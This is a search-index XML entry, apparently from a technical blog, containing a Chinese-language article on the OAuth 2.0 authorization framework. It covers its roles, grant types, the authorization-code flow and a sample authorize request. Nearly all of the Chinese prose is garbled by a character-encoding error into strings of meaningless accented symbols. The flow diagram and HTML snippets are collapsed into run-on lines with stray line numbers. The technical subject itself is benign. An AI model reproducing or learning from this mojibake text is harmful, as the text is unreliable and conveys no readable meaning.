<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[OAuth2.0ÊéàÊùÉÊú∫Âà∂ËØ¶Ëß£]]></title>
    <url>%2F2017%2F12%2F07%2Foauth2%2F</url>
    <content type="text"><![CDATA[ÂΩì‰ªä‰∫íËÅîÁΩëÁöÑÂäüËÉΩÂèØË∞ìÊòØ‰∫îËä±ÂÖ´Èó®, ËÄåÂæàÂ§öÊúçÂä°ÈúÄË¶Å‰æùËµñÁî®Êà∑Â∑≤ÊúâÁöÑÊï∞ÊçÆÊâçËÉΩÊèê‰æõÊúçÂä°, ÊØîÂ¶Ç‰∫ëÂÜ≤Âç∞, ÈúÄË¶ÅËÆøÈóÆÁî®Êà∑‰∫ëÁõòÈáåÈù¢ÁöÑÁÖßÁâáÊï∞ÊçÆ, ÂÜçÊØîÂ¶ÇciÊúçÂä°, ÈúÄË¶ÅËÆøÈóÆÁî®Êà∑‰ª£Á†Å‰ªìÂ∫ìÈáåÈù¢ÁöÑÈ°πÁõÆÊï∞ÊçÆ„ÄÇÂ¶Ç‰ΩïÂÆâÂÖ®ÂæóÂ∞ÜÁî®Êà∑ÁöÑÊï∞ÊçÆÊö¥Èú≤ÁªôÁ¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆÊòØ‰∏Ä‰∏™ÂæàÂ∏∏ËßÅÁöÑÈúÄÊ±Ç, ËÄåOAuthÁöÑÂá∫Áé∞Â∞±ÊòØËß£ÂÜ≥ËøôÁ±ªÈóÆÈ¢òÁöÑ„ÄÇ ‰º†ÁªüËÆ§ËØÅÁöÑÈóÆÈ¢òÂú®‰º†ÁªüÁöÑclient-serverË∫´‰ªΩËÆ§ËØÅÊ®°Âûã‰∏≠, ÂÆ¢Êà∑Á´ØÈÄöËøáËµÑÊ∫êÊâÄÊúâËÄÖ(resource owner)ÁöÑÂá≠ËØÅÊù•ËÆøÈóÆÊúçÂä°Á´ØÁöÑÂèó‰øùÊä§ÁöÑËµÑÊ∫êÔºå ‰∏∫‰∫ÜËÆ©Á¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆÂèóÈôêËµÑÊ∫êÔºå ÂàôÁ¨¨‰∏âÊñπÂ∫îÁî®ÂøÖÈ°ªÂàÜ‰∫´ËµÑÊ∫êÊâÄÊúâËÄÖÁöÑÂá≠ËØÅ,ËøôÂ∞±‰∫ßÁîü‰∫Ü‰∏Ä‰∫õÈóÆÈ¢òÂíåÂ±ÄÈôêÊÄßÔºö Third-party appÈÉΩÈúÄË¶ÅÂ≠òÂÇ®resource ownerÁöÑÂá≠ËØÅ(credentials), ‰ª•Â§áÂ∞ÜÊù•‰πãÁî®, ËÄåcredentialsÂæÄÂæÄÈÉΩÊòØÊòéÊñá serversÂøÖÈ°ªÊîØÊåÅcredentialËÆ§ËØÅÔºå‰πüÂ∞±ÊòØÁî®Êà∑Âêç/ÂØÜÁ†ÅÁöÑËÆ§ËØÅ Third-party appËé∑ÂèñÁöÑËÆøÈóÆresource ownerÁöÑÊâÄÊúâËµÑÊ∫êÁöÑÊùÉÈôêÔºåÂπ∂‰∏îÊó†Êó∂Èó¥ÂíåÂ≠êÈõÜÈôêÂà∂ resource owner‰∏çËÉΩÂçïÁã¨Êí§ÈîÄÊüê‰∏Ä‰∏™Third-party appÁöÑËµÑÊ∫êËÆøÈóÆÊùÉÈôêÔºåËÄåÊí§ÈîÄÊñπÊ≥ïÂè™ËÉΩÈÄöËøá‰øÆÊîπcredentialÂÆåÊàêÔºåËøôÂ∞ÜÊí§ÈîÄÊéâÊâÄÊúâThird-party appÁöÑËµÑÊ∫êËÆøÈóÆÊùÉÈôê ‰ªª‰Ωï‰∏Ä‰∏™ Third-party app ÁöÑÂØÜÁ†ÅÊ≥ÑÈú≤ÔºåÈÉΩÂ∞ÜÂØºËá¥Áî®Êà∑Êï∞ÊçÆÁöÑÊ≥ÑÈú≤ ‰∏æ‰∏Ä‰∏™ÁÆÄÂçï‰∏ÄÁÇπÁöÑÊ†óÂ≠ê: ‰Ω†Êúâ‰∏ÄÂ∫ßÂà´Â¢Ö, Ëøô‰∏™Âà´Â¢ÖÊòØ‰Ω†ÁöÑËµÑ‰∫ß, Ê∏ÖÊ¥ÅÂÖ¨Âè∏Êèê‰æõÂà´Â¢ÖÊ∏ÖÊ¥ÅÊúçÂä°(Á¨¨‰∏âÊñπÊúçÂä°ÂïÜ), Âõ≠Ëâ∫ÂÖ¨Âè∏Êèê‰æõ‰øÆÂâ™Ëä±Âõ≠ÁöÑÊúçÂä°(Á¨¨‰∏âÊñπÊúçÂä°ÂïÜ), ËÄåËøõÂÖ•‰Ω†Âà´Â¢ÖÁöÑÂá≠ËØÅÂ∞±ÊòØÂà´Â¢ÖÁöÑÈí•Âåô, Â¶ÇÊûú‰Ω†Áõ¥Êé•Â∞ÜÈí•Âåô(ËµÑ‰∫ßËÆøÈóÆÂá≠ËØÅ)ÁªôËøô2‰∏™ÊúçÂä°ÂïÜ, ËøôÊòØÂæàÂç±Èô©ÁöÑ, Âõ†‰∏∫‰ªñ‰ª¨‰πüÂèØ‰ª•Â§çÂà∂‰Ω†ÁöÑÈí•Âåô, Ê≠§Êó∂‰Ω†ÁöÑÂà´Â¢ÖÁöÑÂÆâÂÖ®‰ΩìÁ≥ªÂ∞±Â¥©Â°å‰∫Ü, ÂÅáÂ¶Ç‰Ω†ÁúüÁöÑÂæà‰ø°‰ªª‰ªñ‰ª¨, ‰ΩÜÊòØÂ¶ÇÊûúÂõ≠Ëâ∫ÂÖ¨Âè∏ÁöÑ‰∫∫ÊúâÈóÆÈ¢ò, ‰ªñÂèØËÉΩÁõóËµ∞‰∫Ü‰Ω†Áªô‰ªñÁöÑÈí•Âåô, Ê≠§Êó∂ÂíãÂäû, ÂîØÊúâÊç¢ÈîÅ, ‰ΩÜÊòØÈîÅÊç¢‰∫Ü Âà´Â¢ÖÁöÑÊ∏ÖÊ¥ÅÊúçÂä°‰πü‰ºöÂèóÂà∞ÂΩ±Âìç, Âõ†Ê≠§‰Ω†‰ºöÂèëÁé∞ ÊääÈí•ÂåôÁõ¥Êé•ÁªôÁ¨¨‰∏âÊñπÊòØÂæà‰∏çÂÆâÂÖ®ÁöÑ, ‰ºöÂºïÂèëÂæàÂ§öÂÆâÂÖ®ÈöêÊÇ£ÈóÆÈ¢ò„ÄÇ OAuth2ÁöÑËß£ÂÜ≥ÊÄùË∑ØÂØπ‰∫é‰∏äÈù¢ÁöÑÊ†óÂ≠ê, ÂΩìÊúâÂ§ö‰∏™Á¨¨‰∏âÊñπÊúçÂä°ÂïÜË¶ÅËÆøÈóÆÊàë‰ª¨ÁöÑËµÑÊ∫êÊó∂(ËøõÂÖ•Âà´Â¢Ö), ‰ªÖÈÄöËøá1ÊääÈîÅÁöÑÊñπÂºèÊù•‰øùËØÅËµÑ‰∫ßÁöÑÂÆâÂÖ®ËÆøÈóÆÊòØÂæàÊàêÈóÆÈ¢òÁöÑ, Âõ†Ê≠§Êàë‰ª¨ÈúÄË¶Å‰∏ÄÂ±Ç‰∏≠Èó¥Â±ÇÊù•ÁÆ°ÁêÜËøô‰∫õ‰∫∫ÁöÑËÆøÈóÆÊùÉÈôê, Â∏∏ËßÅÁöÑÂÅöÊ≥ïÊòØÊãõ‰∏Ä‰∏™ÁÆ°ÂÆ∂, ÊØèÊ¨°ËÆøÈóÆÊó∂Áî±ÁÆ°ÂÆ∂ËØ¢ÈóÆÂà´Â¢Ö‰∏ª‰∫∫ËøõË°åÊéàÊùÉ„ÄÇ OAuthÁöÑÂÆûÁé∞ÊñπÂºè‰∏éÊ≠§Á±ª‰ºº, OAuthÂú®‚ÄùÂÆ¢Êà∑Á´Ø‚Äù(Á¨¨‰∏âÊñπÊúçÂä°)‰∏é‚ÄùÊúçÂä°Êèê‰æõÂïÜ‚Äù(Áî®Êà∑Ëá™Â∑±ÁöÑËµÑ‰∫ßÊúçÂä°)‰πãÈó¥ÔºåËÆæÁΩÆ‰∫Ü‰∏Ä‰∏™ÊéàÊùÉÂ±Ç(Á±ª‰ºº‰∫é‰∏äÈù¢ÁöÑÁÆ°ÂÆ∂)„ÄÇ‚ÄùÂÆ¢Êà∑Á´Ø‚Äù‰∏çËÉΩÁõ¥Êé•ÁôªÂΩï‚ÄùÊúçÂä°Êèê‰æõÂïÜ‚Äù(Á¨¨‰∏âÊñπÊó†Ê≥ïÁõ¥Êé•ËøõÂÖ•Âà´Â¢Ö), Âè™ËÉΩÁôªÂΩïÊéàÊùÉÂ±Ç(ËØ¢ÈóÆÁÆ°ÂÆ∂)Ôºå‰ª•Ê≠§Â∞ÜÁî®Êà∑(ËµÑ‰∫ßÁöÑ‰∏ª‰∫∫)‰∏éÂÆ¢Êà∑Á´Ø(Á¨¨‰∏âÊñπ)Âå∫ÂàÜÂºÄÊù•„ÄÇ ‚ÄúÂÆ¢Êà∑Á´Ø‚ÄùÁôªÂΩïÊéàÊùÉÂ±ÇÊâÄÁî®ÁöÑ‰ª§Áâå(token), ‰∏éÁî®Êà∑ÁöÑÂØÜÁ†Å‰∏çÂêå„ÄÇÁî®Êà∑ÂèØ‰ª•Âú®ÁôªÂΩïÁöÑÊó∂ÂÄôÔºåÊåáÂÆöÊéàÊùÉÂ±Ç‰ª§ÁâåÁöÑÊùÉÈôêËåÉÂõ¥ÂíåÊúâÊïàÊúü„ÄÇ‚ÄùÂÆ¢Êà∑Á´Ø‚ÄùÁôªÂΩïÊéàÊùÉÂ±Ç‰ª•ÂêéÔºå‚ÄùÊúçÂä°Êèê‰æõÂïÜ‚ÄùÊ†πÊçÆ‰ª§ÁâåÁöÑÊùÉÈôêËåÉÂõ¥ÂíåÊúâÊïàÊúüÔºåÂêë‚ÄùÂÆ¢Êà∑Á´Ø‚ÄùÂºÄÊîæÁî®Êà∑ËµÑ‰∫ßËÆøÈóÆÁöÑÊùÉÈôê„ÄÇ ÂÖ∑‰ΩìËøáÁ®ãÂèØ‰ª•Áî®‰ª•‰∏ãËøôÂº†ÂõæÊù•ÊèèËø∞(Âõæ‰∏≠clientÂ∞±‰ª£Ë°®‰∏≠Èó¥Â±Ç): OAuth2ÁÆÄ‰ªãOAuth(ÂºÄÊîæÊéàÊùÉ)ÊòØ‰∏Ä‰∏™ÂºÄÊîæÊ†áÂáÜÔºåÂÖÅËÆ∏Áî®Êà∑ËÆ©Á¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆËØ•Áî®Êà∑Âú®Êüê‰∏ÄÁΩëÁ´ô‰∏äÂ≠òÂÇ®ÁöÑÁßÅÂØÜÁöÑËµÑÊ∫ê(Â¶ÇÁÖßÁâáÔºåËßÜÈ¢ëÔºåËÅîÁ≥ª‰∫∫ÂàóË°®)ÔºåËÄåÊó†ÈúÄÂ∞ÜÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÊèê‰æõÁªôÁ¨¨‰∏âÊñπÂ∫îÁî®„ÄÇ OAuth1.0Âú®2007Âπ¥ÁöÑ12ÊúàÂ∫ïÂèëÂ∏ÉÂπ∂ËøÖÈÄüÊàê‰∏∫Â∑•‰∏öÊ†áÂáÜ, Âú®OAuth1.0‰∏≠ÈÄöËøáHMACÂíåtoken secretÂä†ÂØÜÂπ∂ÂèëÈÄÅÁöÑÊñπÂºè‰∏∫Á¨¨‰∏âÊñπÂ∫îÁî®È¢ÅÂèë‰∏Ä‰∏™ÊúâÊïàÊúüÈùûÂ∏∏ÈïøÁöÑtoken(ÂÖ∏ÂûãÁöÑÊòØ‰∏ÄÂπ¥ÊúâÊïàÊúüÊàñËÄÖÊó†ÊúâÊïàÊúüÈôêÂà∂)„ÄÇ OAuth2.0Âú®2012Âπ¥10ÊúàÂçèËÆÆÊ≠£ÂºèÂèëÂ∏É‰∏∫RFC 6749. Áé∞Âú®ÂæàÂ§öÂºÄÊîæÂπ≥Âè∞ÈÉΩÊòØ‰ΩøÁî®ÁöÑOAuth 2.0ÂçèËÆÆ‰Ωú‰∏∫ÊîØÊíë„ÄÇÊØîÂ¶ÇÁôæÂ∫¶ÂºÄÂèëÂπ≥Âè∞, ÂæÆËñÑÂºÄÊîæÂπ≥Âè∞, ÂæÆ‰ø°ÂºÄÊîæÂπ≥Âè∞, Google‰ª•ÂèäFacebookÁöÑÂºÄÊîæÊúçÂä°, ÊòæÁÑ∂OAuth2.0Â∑≤ÁªèÊàê‰∏∫‰∫Ü‰∏ã‰∏Ä‰ª£ÁöÑ‚ÄúÁî®Êà∑È™åËØÅÂíåÊéàÊùÉ‚ÄùÁöÑ‰∫íËÅîÁΩëÊ†áÂáÜÂçèËÆÆ„ÄÇ‰ΩÜÊòØ, ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØOAuth 2.0 ÁöÑÂá∫Áé∞ÔºåÂ∞ÜÂÆåÂÖ®Âèñ‰ª£OAuth 1.0, Âπ∂‰∏î2.0ÂÆåÂÖ®‰∏çÂÖºÂÆπ1.0Ôºå ÊâÄÊúâ1.0Â∞ÜÂ∫üÂºÉ„ÄÇ Áõ∏ÂØπ‰∫éOAuth1.0‰∏≠ÂèëË°å‰∏Ä‰∏™ÊúâÊïàÊúüÈùûÂ∏∏ÈïøÁöÑtoken, OAuth2.0ÈááÁî®Áü≠ÊúâÊïàÊúütoken(access token)ÂíåÈïøÁîüÂëΩÂë®Êúü(refresh token)ÁöÑÊñπÂºè, ËøôÂ∞ÜÂÖÅËÆ∏ÂÆ¢Êà∑Á´ØÊó†ÈúÄÁî®Êà∑ÂÜçÊ¨°Êìç‰ΩúËÄåËé∑Âèñ‰∏Ä‰∏™Êñ∞ÁöÑaccess tokenÔºåÂπ∂‰∏î‰πüÈôêÂà∂‰∫Üaccess tokenÁöÑÊúâÊïàÊúü„ÄÇ OAuth2.0Â∞ÜËßíËâ≤ËøõË°å‰∫ÜÊãÜÂàÜ, ÂàÜ‰∏∫: Authorization Server: Ë¥üË¥£Ëé∑ÂèñÁî®Êà∑ÁöÑÊéàÊùÉÂπ∂‰∏îÂèëÂ∏Étoken Resource Server: Ë¥üË¥£Â§ÑÁêÜAPI calls Âú®Êâ©Â±ïÊÄß‰∏äÂæóÂà∞‰∫ÜËøõ‰∏ÄÊ≠•ÊèêÂçá, ËÄå‰∏îËøôÁßçÊñπÂºèÊûÅÂÖ∂Êñπ‰æøÂºÄÂèëÂàÜÂ∏ÉÂºèÂ∫îÁî®, ÊòØÂæÆÊúçÂä°Êó∂‰ª£ÊéàÊùÉ‰∏≠ÂøÉÁöÑ‰∏ç‰∫å‰πãÈÄâ„ÄÇ OAuth2ÁöÑÂ∫îÁî®Âú∫ÊôØÁé∞Âú®ÂæàÂ§öÁΩëÁ´ôÈÉΩÂÖÅËÆ∏ÈÄöËøáGoogle, QQ, Êñ∞Êµ™, ÂæÆ‰ø°Á≠âË¥¶Âè∑Áõ¥Êé•ÁôªÂΩïÁΩëÁ´ôÔºåËøôÂ∞±ÊòØOAuthÊúÄÂ∏∏ËßÅÁöÑ‰∏ÄÁßç‰ΩøÁî®Âú∫ÊôØÔºå‰ªñËÆ©Á¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆ‰Ω†Â≠òÂÇ®Âú®QQÊàñËÄÖÂæÆ‰ø°‰∏äÁöÑÁî®Êà∑‰ø°ÊÅØ, ÊØîÂ¶ÇÊãâÂãæÁΩë:ÂΩì‰Ω†ÁÇπÂáª‰ªªÊÑè‰∏Ä‰∏™Êó∂, ÈÉΩÂ∞Ü‰ºöË∑≥ËΩ¨Âà∞‰ªñ‰ª¨ÁöÑËÆ§ËØÅÊúçÂä°Âô®ËøõË°åËÆ§ËØÅ, ÊâÄ‰ª•Á¨¨‰∏âÊñπÂ∫îÁî®ÊòØ‰∏ç‰ºöËé∑ÂèñÁî®Êà∑ÁöÑcredential(Áî®Êà∑ÂêçÂíåÂØÜÁ†Å), Âπ∂‰∏îÂèØ‰ª•ÈÄâÊã©Âì™‰∫õËµÑÊ∫êË¢´ËÆøÈóÆÔºå ËÄå‰∏îËÆøÈóÆ‰πüÊòØÊúâÊó∂ÊïàÊÄßÁöÑÔºå ‰∏ÄËà¨Âú®1Â∞èÊó∂ÊàñËÄÖ2‰∏™Â∞èÊó∂Âêé ËÆøÈóÆtokenÂ∞±‰ºöËøáÊúü„ÄÇ Âá°ÊòØÁî®Êà∑Ëá™Â∑±ÁöÑÊï∞ÊçÆ, ÈÉΩÂèØ‰ª•ÈÄöËøáOAuth2Êù•ÂºÄÊîæÁªôÁ¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆ, ‰∏äÈù¢ËøôÁßçÈÄöËøáËÆøÈóÆÁî®Êà∑ÁöÑprofile‰ø°ÊÅØÂÆûÁé∞Á¨¨‰∏âÊñπÁôªÂΩï‰ªÖ‰ªÖÊòØÊØîËæÉÊôÆÈÅçËÄåÂ∑≤, ‰Ω†‰πüÂèØ‰ª•ÂàÜ‰∫´‰Ω†ÂØπËµÑÊ∫êÁöÑÂÖ∂‰ªñÊùÉÈôê, ÊØîÂ¶ÇÂæÆËñÑÂèØ‰ª•ËÆ©Á¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆÁî®Êà∑ÂèëË°®ÂæÆËñÑ,‰ª•ÂèäÂàÜ‰∫´ÂæÆËñÑ: ÊÄª‰πãÈÄöËøáOAuth2.0Áî®Êà∑ÂèØ‰ª•ÈÄâÊã©ÊÄßÁöÑÊö¥Èú≤Ëá™Â∑±ÁöÑ‰ø°ÊÅØ, ÁîöËá≥ÊòØAPIÁöÑËÆøÈóÆÊùÉÈôê„ÄÇÊØîÂ¶ÇÊéàÊùÉÊüê‰∫õÁ¨¨‰∏âÊñπÂ∫îÁî®ÂèØ‰ª•Âà†Èô§‰Ω†ÁöÑÂæÆËñÑ‰ø°ÊÅØ„ÄÇ OAuth2ÁöÑÊéàÊùÉÊµÅÁ®ãÂú®OAuth 2.0ÂÆö‰πâ‰∫Ü4ÁßçËßíËâ≤Ôºå‰ª•‰∏äÈù¢ÊèêÂà∞ÁöÑÂ∫îÁî®Âú∫ÊôØÁöÑ‰æãÂ≠êËøõË°åËØ¥Êòé: Resource Owner: ËµÑÊ∫êÊâÄÊúâËÄÖÔºåËøôÈáåÊåáÁöÑQQÁöÑÊúÄÁªàÁî®Êà∑ÊàëÔºå ËÄåËµÑÊ∫êÊåáÊàëÂ≠òÂÇ®Âú®QQÊúçÂä°ÈáåÈù¢ÁöÑ‰∏Ä‰∫õ‰∏™‰∫∫‰ø°ÊÅØ: ÊòµÁß∞„ÄÅÂ§¥ÂÉè„ÄÅÊÄßÂà´Á≠â„ÄÇ Resource Server: ËµÑÊ∫êÊúçÂä°Âô®ÔºåÂèä‰øùÂ≠òÊàëqqÊòµÁß∞„ÄÅÂ§¥ÂÉè„ÄÅÊÄßÂà´Ëøô‰∫õËµÑÊ∫êÁöÑÂêéÁ´ØÊúçÂä°, ‰∏ÄËà¨ÈúÄË¶ÅÈÄöËøáaccess_tokenÊù•ËÆøÈóÆËøô‰∫õÂèó‰øùÊä§ÁöÑËµÑÊ∫ê„ÄÇ Client: Á¨¨‰∏âÊñπÂ∫îÁî®Ôºå ËøôÈáåÊåá‰ª£ÊãâÈí©ÁΩë Authorization Server: ÊéàÊùÉÊúçÂä°Âô®ÔºåËøôÈáåÊåáqqÁöÑÊéàÊùÉÊúçÂä°Âô®, ÂèäÊèê‰æõÊéàÊùÉÁ°ÆËÆ§È°µÈù¢ÁöÑÂêéÁ´ØÊéàÊùÉÊúçÂä°„ÄÇÂΩìÁî®Êà∑ËÆ§ËØÅÂíåÊéàÊùÉÊàêÂäüÂêé,Áî±ËØ•ÊúçÂä°Âêëclient(Á¨¨‰∏âÊñπÂ∫îÁî®)È¢ÅÂèëaccess_token ÊéàÊùÉÊµÅÁ®ãÂõ¥ÁªïÁùÄËøô4‰∏™Ê¶ÇÂøµ, Êàë‰ª¨Êù•ËØ¥Êòé‰∏ãOAuth2.0ÁöÑÊéàÊùÉÊµÅÁ®ã: Á¨¨‰∏âÊñπÂ∫îÁî®ËØ∑Ê±ÇËµÑÊ∫êÊâÄÊúâËÄÖÊéàÊùÉ, ÊéàÊùÉËØ∑Ê±ÇÂæÄÂæÄÈÄöËøá‰∏≠ËΩ¨Âà∞ÊéàÊùÉÊúçÂä°Êù•È™åËØÅËµÑÊ∫êÊâÄÊúâËÄÖÁöÑË∫´‰ªΩ, ÊØîÂ¶ÇÂ∫îÁî®Âú∫ÊôØÈáåÈù¢ÈÇ£‰∫õÈúÄË¶ÅÁî®Êà∑ÁôªÂΩïÁöÑÈ°µÈù¢ Á¨¨‰∏âÊñπÂ∫îÁî®Ëé∑ÂæóËµÑÊ∫êÊâÄÊúâËÄÖÁöÑÊéàÊùÉ, ÊØîÂ¶ÇÂ∫îÁî®Âú∫ÊôØÈáåÈù¢ÈúÄË¶ÅÁî®Êà∑ÁÇπÂáªÁöÑÊéàÊùÉÊåâÈíÆ, OAuth2ÂÆö‰πâ‰∫Ü4ÁßçÊéàÊùÉÁöÑÊñπÂºè,ÁÆÄÁß∞ÊéàÊùÉÊ®°Âºè, ÂêéÈù¢È©¨‰∏äËÆ≤Âà∞,ÂΩìÁÑ∂‰Ω†‰πüÂèØ‰ª•Êâ©Â±ïËá™Â∑±ÁöÑÊéàÊùÉÊ®°Âºè„ÄÇ Á¨¨‰∏âÊñπÂ∫îÁî®Ê†πÊçÆÁî®Êà∑ÁöÑÊéàÊùÉ ÂêëÊéàÊùÉÊúçÂä° ËØ∑Ê±ÇËÆøÈóÆËµÑÊ∫êÁöÑtoken ÊéàÊùÉÊúçÂä° Ê†πÊçÆÁî®Êà∑ÁöÑÊéàÊùÉ ËøîÂõûÁªôÁ¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆËµÑÊ∫êÁöÑtoken Á¨¨‰∏âÊñπÂ∫îÁî®Ê†πÊçÆËé∑ÂèñÂà∞ÁöÑtoken ÂêëËµÑÊ∫êÊúçÂä° ËØ∑Ê±ÇËµÑÊ∫ê ËµÑÊ∫êÊúçÂä° ÂìçÂ∫îËµÑÊ∫êÁªôÁ¨¨‰∏âÊñπÂ∫îÁî® Áî±Ê≠§ÂèØËßÅÊµÅÁ®ãÁöÑÂÖ≥ÈîÆÂú®‰∫éÁ¨¨‰∫åÈÉ®(2), Âõ†‰∏∫ËøôÈáåÊòØAuthorization layer, ÂÆÉÂÜ≥ÂÆö‰∫ÜÁî®Êà∑Êèê‰æõÁöÑÊéàÊùÉÊâπÂáÜ‰ø°ÊÅØ‰ª•‰ΩïÁßçÂΩ¢ÂºèËøîÂõûÁªôclientËÆ©ÂÖ∂Âá≠ÂÄüÊ≠§‰ø°ÊÅØËé∑ÂèñËÆøÈóÆ‰ª§Áâå(access token) ÂÆ¢Êà∑Á´ØÁöÑÊéàÊùÉÊ®°ÂºèÊéàÊùÉËÆ∏ÂèØ(Authorization Grant)ÊòØ‰∏Ä‰∏™‰ª£Ë°®ËµÑÊ∫êÊâÄÊúâËÄÖËÆøÈóÆËá™Â∑±ËµÑÊ∫êÁöÑ‰∏ÄÁßçÂá≠ËØÅ, Áî®‰∫éÁ¨¨‰∏âÊñπÂ∫îÁî®Áî≥ËØ∑ËÆøÈóÆ‰ª§Áâå(access token), oauthÂÆö‰πâ‰∫Ü4ÁßçÊéàÊùÉÊ®°Âºè: ÊéàÊùÉÁ†ÅÊ®°ÂºèÔºàauthorization codeÔºâ ÁÆÄÂåñÊ®°ÂºèÔºàimplicitÔºâ ÂØÜÁ†ÅÊ®°ÂºèÔºàresource owner password credentialsÔºâ ÂÆ¢Êà∑Á´ØÊ®°ÂºèÔºàclient credentialsÔºâ ÊØè‰∏ÄÁßçÊ®°ÂºèÂ∫îÂØπ‰∏çÂêåÁöÑÊéàÊùÉÂú∫ÊôØ, Â¶ÇÊûúoauthÂÆö‰πâÁöÑËøô4ÁßçÊ®°ÂºèÊó†Ê≥ïÊª°Ë∂≥‰Ω†ÁöÑÊéàÊùÉÈúÄÊ±Ç, ‰Ω†ÂèØ‰ª•Ëá™ÂÆö‰πâ‰∏ÄÁßçÊéàÊùÉÊ®°ÂºèËøõË°åÂÆûÁé∞, Âõ†Ê≠§ÁÅµÊ¥ªÊÄß‰∏äÊúâÂæàÂ§ßÁöÑ‰øùËØÅ„ÄÇ ÊéàÊùÉÁ†ÅÊ®°ÂºèÊéàÊùÉÁ†ÅÊ®°Âºè(authorization code)ÊòØÂäüËÉΩÊúÄÂÆåÊï¥„ÄÅÊµÅÁ®ãÊúÄ‰∏•ÂØÜÁöÑÊéàÊùÉÊ®°Âºè, ‰πüÊòØÂêÑÂ§ßÂºÄÊîæÂπ≥Âè∞‰∏ªË¶Å‰ΩøÁî®ÁöÑÊ®°Âºè, ÂÆÉÁöÑÁâπÁÇπÂ∞±ÊòØÂú®client‰∏éresource ownerÁõ¥Êé•Âä†ÂÖ•‰∏ÄÂ±ÇÊéàÊùÉÊúçÂä°(authorization server)‰Ωú‰∏∫‰∏≠‰ªã, ËßÑÈÅø‰∫Üresource ownerÂíåclientÁõ¥Êé•‰∫§‰∫í‰∫ßÁîüÁöÑÂÆâÂÖ®ÈöêÊÇ£, ËØ•Ê®°ÂºèÂÆåÁæéÁöÑËß£ÂÜ≥‰∫Ü‰πãÂâçÊèêÂà∞ÁöÑ‰º†Áªüclient-serverËÆ§ËØÅÊ®°Âºè‰∏≠ÁöÑÁ¨¨‰∏âÊñπÂ∫îÁî®ËÆøÈóÆËµÑ‰∫ßÊâÄÊúâËÄÖÊï∞ÊçÆÁöÑÈöæÈ¢ò„ÄÇ Â∫îÁî®Âú∫ÊôØ: Á¨¨‰∏âÊñπÂ∫îÁî®ÈúÄË¶ÅËÆøÈóÆËµÑ‰∫ßÊâÄÊúâËÄÖÁöÑÊï∞ÊçÆ„ÄÇÂπ∂‰∏îÁ¨¨‰∏âÊñπÂ∫îÁî®ÊúâËá™Â∑±ÁöÑÊúçÂä°Á´Ø, ‰πüÂ∞±ÊòØÂ∏∏ËßÅÁöÑServer-Side ApplicationÂÖ∏ÂûãÂ∫îÁî®: Á¨¨‰∏âÊñπÁôªÂΩï, ÊØîÂ¶Ç‰∏äÈù¢ÊèêÂà∞ÁöÑÂú∫ÊôØÊµÅÁ®ãÂõæ:12345678910111213141516171819202122232425+----------+| Resource || Owner || |+----------+ ^ | (B)+----|-----+ Client Identifier +---------------+| -+----(A)-- &amp; Redirection URI ----&gt;| || User- | | Authorization || Agent -+----(B)-- User authenticates ---&gt;| Server || | | || -+----(C)-- Authorization Code ---&lt;| |+-|----|---+ +---------------+ | | ^ v(A) (C) | | | | | | ^ v | |+---------+ | || |&gt;---(D)-- Authorization Code ---------&apos; || Client | &amp; Redirection URI || | || |&lt;---(E)----- Access Token -------------------&apos;+---------+ (w/ Optional Refresh Token) A. Áî®Êà∑ÈÄöËøáÊµèËßàÂô®ËÆøÈóÆÊéàÊùÉÊúçÂä°Âô®, ‰∏ÄËà¨ÊòØÁ¨¨‰∏âÊñπÂ∫îÁî®ÊîæÁΩÆÈìæÊé•, Â∞ÜÁî®Êà∑ÂºïÂØºËá≥Áõ∏Â∫îÁöÑÊéàÊùÉÊúçÂä°Âô®ÊØîÂ¶Ç‰ª•‰∏äÈù¢ÊãâÂãæ‰∏∫‰æã, ‰ªñ‰ºöÊîæÁΩÆÊúâÂèØËÉΩÂ≠òÂÇ®Áî®Êà∑profile‰ø°ÊÅØÁöÑÊéàÊùÉÊúçÂä°Âô®ÁöÑËÆøÈóÆÂú∞ÂùÄ:123&lt;a href="/oauth20/auth_sinaWeiboProvider.html" target="_blank" class="icon_wb" title="‰ΩøÁî®Êñ∞Êµ™ÂæÆÂçöÂ∏êÂè∑ÁôªÂΩï"&gt;&lt;/a&gt;&lt;a href="/oauth20/auth_qqProvider.html" class="icon_qq" target="_blank" title="‰ΩøÁî®ËÖæËÆØQQÂ∏êÂè∑ÁôªÂΩï"&gt;&lt;/a&gt;&lt;a href="/oauth20/auth_weixinProvider.html" class="icon_weixin" target="_blank" title="‰ΩøÁî®ÂæÆ‰ø°Â∏êÂè∑ÁôªÂΩï"&gt;&lt;/a&gt; ÊØîÂ¶ÇÊàëËÆ©ÊãâÂãæÁΩëËØªÂèñÊàëÂ≠òÂÇ®Âú®ÂæÆÂçö‰∏äÈù¢ÁöÑÁî®Êà∑ËµÑÊñô, Âõ†Ê≠§Êàë‰ºöË¢´ÂºïÂØºËá≥ÂæÆÂçöÁöÑÊéàÊùÉÊúçÂä°,ËøõË°åÊéàÊùÉ, ÂêåÊó∂ÊãâÂãæÁΩë‰ºöÂ∏¶‰∏äËá™Â∑±Âú®ÂæÆÂçöÂºÄÊîæÂπ≥Âè∞Ê≥®ÂÜåÁöÑÂÆ¢Êà∑Á´Ø‰ø°ÊÅØ, Â¶Ç‰∏ãÂõæ:ËÄåÂÖ∑‰ΩìÁöÑÊéàÊùÉËØ∑Ê±ÇÊ†ºÂºèÂ¶Ç‰∏ã:123GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1Host: server.example.com ÂÖ∂‰∏≠ÁöÑÂèÇÊï∞: response_typeÔºöË°®Á§∫ÊéàÊùÉÁ±ªÂûãÔºåÂøÖÈÄâÈ°πÔºåÊ≠§Â§ÑÁöÑÂÄºÂõ∫ÂÆö‰∏∫‚Äùcode‚Äù client_idÔºöË°®Á§∫ÂÆ¢Êà∑Á´ØÁöÑIDÔºåÂøÖÈÄâÈ°π redirect_uriÔºöË°®Á§∫ÈáçÂÆöÂêëURIÔºåÂèØÈÄâÈ°π 